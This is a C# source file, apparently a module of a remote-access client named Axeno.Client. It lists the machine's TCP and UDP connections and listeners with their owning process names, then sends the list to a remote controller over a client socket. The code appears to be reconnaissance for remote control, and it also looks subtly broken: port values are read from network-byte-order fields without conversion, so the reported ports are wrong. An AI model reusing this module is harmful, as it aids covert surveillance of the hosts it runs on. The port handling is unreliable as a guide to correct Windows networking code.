using Axeno.Client.MessagePack;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Axeno.Client.Networking.Functions.Networking
{
    internal class NetworkConnections
    {

        public static void Handle()
        {

            ClientSocket.Send(GetNetworkConnections());

        }
        public static byte[] GetNetworkConnections()
        {
            var tcpConnections = GetExtendedTcpTable();
            var udpListeners = GetExtendedUdpTable();
            var properties = IPGlobalProperties.GetIPGlobalProperties();
            var tcpListeners = properties.GetActiveTcpListeners();
            var tcpConnectionInfo = GetExtendedTcpTable2(TCP_TABLE_OWNER_PID_CONNECTIONS);

            StringBuilder sb = new StringBuilder();
            foreach (var connection in tcpConnections)
            {
                var processName = "/";
                try
                {
                    processName = Process.GetProcessById(connection.ProcessId).ProcessName;

                }
                catch { }

                sb.Append($"Process({processName})Localaddr({connection.LocalEndPoint.Address})Localport({connection.LocalEndPoint.Port})Remoteaddr({connection.RemoteEndPoint.Address})Remoteport({connection.RemoteEndPoint.Port})Protocol(TCP)State({connection.State})(SPLITHERE)");
            }
            foreach (var listener in udpListeners)
            {
                var processName = "/";
                string state = "Error";
                try
                {
                    processName = Process.GetProcessById(listener.ProcessId).ProcessName;

                    state = "NoError";
                }

                catch { }

                sb.Append($"Process({processName})Localaddr({listener.LocalEndPoint.ToString().Split(':')[0]})Localport({listener.LocalEndPoint.ToString().Split(':')[1]})Remoteaddr(/)Remoteport(/)Protocol(UDP)State({state})(SPLITHERE)");
            }

            foreach (var listener in tcpListeners)
            {
                var processName = "/";
                var state = "Listening";
                try
                {
                    var match = tcpConnectionInfo.FirstOrDefault(x => x.LocalEndPoint.Equals(listener) && x.State == TcpState.Listen);
                    if (match != null)
                    {
                        try
                        {
                            processName = Process.GetProcessById(match.ProcessId).ProcessName;
                            state = match.State.ToString();
                        }
                        catch { }
                    }
                }
                catch { }


                sb.Append($"Process({processName})Localaddr({listener.Address})Localport({listener.Port})Remoteaddr(/)Remoteport(/)Protocol(TCP)State({state})(SPLITHERE)");
            }

            MsgPack mpack = new MsgPack();
            mpack.ForcePathObject("Packet").AsString = "NetworkConnections";
            mpack.ForcePathObject("Data").AsString = sb.ToString();
            return mpack.Encode2Bytes();

        }
        public class TcpConnectionInfo
        {
            public IPEndPoint LocalEndPoint { get; set; }
            public IPEndPoint RemoteEndPoint { get; set; }
            public int ProcessId { get; set; }
            public TcpState State { get; set; }
        }

        public class UdpConnectionInfo
        {
            public IPEndPoint LocalEndPoint { get; set; }
            public int ProcessId { get; set; }
        }

        [DllImport("iphlpapi.dll", SetLastError = true)]
        private static extern int GetExtendedTcpTable(IntPtr pTcpTable, ref int pdwSize, bool bOrder, int ulAf, int tableClass, int reserved);

        [DllImport("iphlpapi.dll", SetLastError = true)]
        private static extern int GetExtendedUdpTable(IntPtr pUdpTable, ref int pdwSize, bool bOrder, int ulAf, int tableClass, int reserved);

        private const int AF_INET = 2; // Address family for IPv4
        private const int TCP_TABLE_OWNER_PID_CONNECTIONS = 4;
        private const int UDP_TABLE_OWNER_PID = 1;


        public static List<TcpConnectionInfo> GetExtendedTcpTable2(int tableClass)
        {
            int bufferSize = 0;
            int ret = GetExtendedTcpTable(IntPtr.Zero, ref bufferSize, true, AF_INET, tableClass, 0);

            if (ret != 0 && ret != 122) // 122 is ERROR_INSUFFICIENT_BUFFER
            {
                throw new Win32Exception(ret);
            }

            IntPtr tcpTablePtr = Marshal.AllocHGlobal(bufferSize);
            try
            {
                ret = GetExtendedTcpTable(tcpTablePtr, ref bufferSize, true, AF_INET, tableClass, 0);
                if (ret != 0)
                {
                    throw new Win32Exception(ret);
                }

                int numEntries = Marshal.ReadInt32(tcpTablePtr);
                IntPtr currentPtr = new IntPtr(tcpTablePtr.ToInt64() + Marshal.SizeOf(typeof(int)));

                var connections = new List<TcpConnectionInfo>();

                for (int i = 0; i < numEntries; i++)
                {
                    var row = Marshal.PtrToStructure<MIB_TCPROW_OWNER_PID>(currentPtr);
                    connections.Add(new TcpConnectionInfo
                    {
                        LocalEndPoint = new IPEndPoint(row.dwLocalAddr, BitConverter.ToInt32(BitConverter.GetBytes(row.dwLocalPort), 0)),
                        RemoteEndPoint = new IPEndPoint(row.dwRemoteAddr, BitConverter.ToInt32(BitConverter.GetBytes(row.dwRemotePort), 0)),
                        ProcessId = row.dwOwningPid,
                        State = (TcpState)row.dwState
                    });

                    currentPtr = new IntPtr(currentPtr.ToInt64() + Marshal.SizeOf(typeof(MIB_TCPROW_OWNER_PID)));
                }

                return connections;
            }
            finally
            {
                Marshal.FreeHGlobal(tcpTablePtr);
            }
        }


        public static List<TcpConnectionInfo> GetExtendedTcpTable()
        {
            int bufferSize = 0;
            int ret = GetExtendedTcpTable(IntPtr.Zero, ref bufferSize, true, AF_INET, TCP_TABLE_OWNER_PID_CONNECTIONS, 0);

            if (ret != 0 && ret != 122) // 122 is ERROR_INSUFFICIENT_BUFFER
            {
                throw new Win32Exception(ret);
            }

            IntPtr tcpTablePtr = Marshal.AllocHGlobal(bufferSize);
            try
            {
                ret = GetExtendedTcpTable(tcpTablePtr, ref bufferSize, true, AF_INET, TCP_TABLE_OWNER_PID_CONNECTIONS, 0);
                if (ret != 0)
                {
                    throw new Win32Exception(ret);
                }

                int numEntries = Marshal.ReadInt32(tcpTablePtr);
                IntPtr currentPtr = new IntPtr(tcpTablePtr.ToInt64() + Marshal.SizeOf(typeof(int)));

                var connections = new List<TcpConnectionInfo>();

                for (int i = 0; i < numEntries; i++)
                {
                    var row = Marshal.PtrToStructure<MIB_TCPROW_OWNER_PID>(currentPtr);
                    connections.Add(new TcpConnectionInfo
                    {
                        LocalEndPoint = new IPEndPoint(row.dwLocalAddr, BitConverter.ToInt32(BitConverter.GetBytes(row.dwLocalPort), 0)),
                        RemoteEndPoint = new IPEndPoint(row.dwRemoteAddr, BitConverter.ToInt32(BitConverter.GetBytes(row.dwRemotePort), 0)),
                        ProcessId = row.dwOwningPid,
                        State = (TcpState)row.dwState
                    });

                    currentPtr = new IntPtr(currentPtr.ToInt64() + Marshal.SizeOf(typeof(MIB_TCPROW_OWNER_PID)));
                }

                return connections;
            }
            finally
            {
                Marshal.FreeHGlobal(tcpTablePtr);
            }
        }
        public static List<UdpConnectionInfo> GetExtendedUdpTable()
        {
            int bufferSize = 0;
            int ret = GetExtendedUdpTable(IntPtr.Zero, ref bufferSize, true, AF_INET, UDP_TABLE_OWNER_PID, 0);

            if (ret != 0 && ret != 122) // 122 is ERROR_INSUFFICIENT_BUFFER
            {
                throw new Win32Exception(ret);
            }

            IntPtr udpTablePtr = Marshal.AllocHGlobal(bufferSize);
            try
            {
                ret = GetExtendedUdpTable(udpTablePtr, ref bufferSize, true, AF_INET, UDP_TABLE_OWNER_PID, 0);
                if (ret != 0)
                {
                    throw new Win32Exception(ret);
                }

                int numEntries = Marshal.ReadInt32(udpTablePtr);
                IntPtr currentPtr = new IntPtr(udpTablePtr.ToInt64() + Marshal.SizeOf(typeof(int)));

                var listeners = new List<UdpConnectionInfo>();

                for (int i = 0; i < numEntries; i++)
                {
                    var row = Marshal.PtrToStructure<MIB_UDPROW_OWNER_PID>(currentPtr);
                    listeners.Add(new UdpConnectionInfo
                    {
                        LocalEndPoint = new IPEndPoint(row.dwLocalAddr, BitConverter.ToInt32(BitConverter.GetBytes(row.dwLocalPort), 0)),
                        ProcessId = row.dwOwningPid
                    });

                    currentPtr = new IntPtr(currentPtr.ToInt64() + Marshal.SizeOf(typeof(MIB_UDPROW_OWNER_PID)));
                }

                return listeners;
            }
            finally
            {
                Marshal.FreeHGlobal(udpTablePtr);
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct MIB_TCPROW_OWNER_PID
        {
            public uint dwState;
            public uint dwLocalAddr;
            public uint dwLocalPort;
            public uint dwRemoteAddr;
            public uint dwRemotePort;
            public int dwOwningPid;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct MIB_UDPROW_OWNER_PID
        {
            public uint dwLocalAddr;
            public uint dwLocalPort;
            public int dwOwningPid;
        }

    }
}
